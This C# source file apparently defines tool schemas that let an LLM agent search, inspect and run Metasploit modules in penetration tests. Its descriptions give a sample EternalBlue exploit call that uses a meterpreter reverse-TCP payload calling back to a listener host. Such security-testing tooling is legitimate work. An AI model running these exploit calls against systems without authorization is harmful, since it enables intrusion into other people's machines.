using NetworkMonitor.Objects.ServiceMessage;
using NetworkMonitor.Utils;
using NetworkMonitor.Objects;
using NetworkMonitor.Objects.Factory;
using Betalgo.Ranul.OpenAI;
using Betalgo.Ranul.OpenAI.Builders;
using Betalgo.Ranul.OpenAI.Managers;
using Betalgo.Ranul.OpenAI.ObjectModels;
using Betalgo.Ranul.OpenAI.ObjectModels.RequestModels;
using Betalgo.Ranul.OpenAI.ObjectModels.SharedModels;
using System;
using System.Collections.Generic;
using System.Net.Mime;

namespace NetworkMonitor.LLM.Services;

public class PenetrationTools
{

    public static FunctionDefinition BuildRunMetasploitFunction()
    {
        return new FunctionDefinitionBuilder("run_metasploit",
            "Executes a Metasploit module with parameter validation. Structure requests as: " +
            "1. First search modules with search_metasploit_modules " +
            "2. Get module details with get_metasploit_module_info " +
            "3. Execute with required parameters. " +
            "Example: To exploit EternalBlue: {'module_name':'exploit/windows/smb/ms17_010_eternalblue','target':'192.168.1.5','module_options':{'RHOSTS':'192.168.1.5','LHOST':'10.0.0.1'}}")
        .AddParameter("module_name", PropertyDefinition.DefineString(
            "[REQUIRED] Full module path from search results. Example: 'exploit/windows/smb/ms17_010_eternalblue'"))
        .AddParameter("module_options", PropertyDefinition.DefineString(
            "JSON object with Metasploit module options. Must include 'RHOSTS'. " +
            "Example: { \"RHOSTS\": \"192.168.1.5\", \"LHOST\": \"10.0.0.1\", \"PAYLOAD\": \"windows/meterpreter/reverse_tcp\" }"))
        .AddParameter("target", PropertyDefinition.DefineString(
            "[REQUIRED] IP/Domain/CIDR range. Validate format first. Example: '192.168.1.0/24'"))
        .AddParameter("agent_location", PropertyDefinition.DefineString(
            "Predefined agent locations. Default: auto-assign based on target geoIP"))
        .AddParameter("number_lines", PropertyDefinition.DefineInteger(
            "Output lines to return. Default: 20. Max: 100."))
        .AddParameter("page", PropertyDefinition.DefineInteger(
            "Pagination for large outputs. Start with 1. Increment if 'truncated' flag is set."))
        .Validate()
        .Build();
    }
    public static FunctionDefinition BuildSearchMetasploitFunction()
    {
        return new FunctionDefinitionBuilder("search_metasploit_modules",
            "Search modules with filters. Always start penetration tests with this to find appropriate modules. " +
            "Example: Find Windows SMB exploits: {'module_type':'exploit','platform':'windows','service':'smb'}")
            .AddParameter("module_type", PropertyDefinition.DefineEnum(
                new List<string> { "exploit", "auxiliary", "post", "payload", "encoder", "nop" },
                "Category filter. Multiple allowed with commas. Example: 'exploit,auxiliary'"))
            .AddParameter("platform", PropertyDefinition.DefineEnum(
                new List<string> { "windows", "linux", "android", "multi" },
                "OS filter. Use 'multi' for cross-platform"))
            .AddParameter("service", PropertyDefinition.DefineEnum(
                new List<string> { "smb", "http", "ssh", "ftp", "rdp" },
                "Affected service filter"))
            .AddParameter("cve", PropertyDefinition.DefineString(
                "CVE ID with validation. Format: CVE-YYYY-NNNNN. Example: CVE-2017-0144"))
            .AddParameter("edb", PropertyDefinition.DefineString(
                "Exploit-DB ID. Must be numeric. Example: 42315"))
            .AddParameter("rank", PropertyDefinition.DefineEnum(
                new List<string> { "excellent", "great", "good", "average" },
                "Minimum reliability rating. Default: 'good'"))
            .AddParameter("keywords", PropertyDefinition.DefineString(
                "Space-separated search terms. Example: 'exchange privilege escalation'"))
            .AddParameter("number_lines", PropertyDefinition.DefineInteger(
                "Results per page. Default: 10. Max: 50."))
            .AddParameter("page", PropertyDefinition.DefineInteger(
                "Pagination control. Start with 1. Increment if 'more_results'=true"))
            .Validate()
            .Build();
    }

    public static FunctionDefinition BuildMetasploitModuleInfoFunction()
    {
        return new FunctionDefinitionBuilder("get_metasploit_module_info",
            "Get module requirements BEFORE execution. Required step between search and run. " +
            "Example: {'module_name':'exploit/windows/smb/ms17_010_eternalblue'}")
            .AddParameter("module_name", PropertyDefinition.DefineString(
                "[REQUIRED] Exact module path from search results. Case-sensitive."))
            .AddParameter("show_options", PropertyDefinition.DefineBoolean(
                "Include full parameter details. Default: true"))
            .AddParameter("show_examples", PropertyDefinition.DefineBoolean(
                "Include usage examples. Default: true"))
            .Validate()
            .Build();
    }
}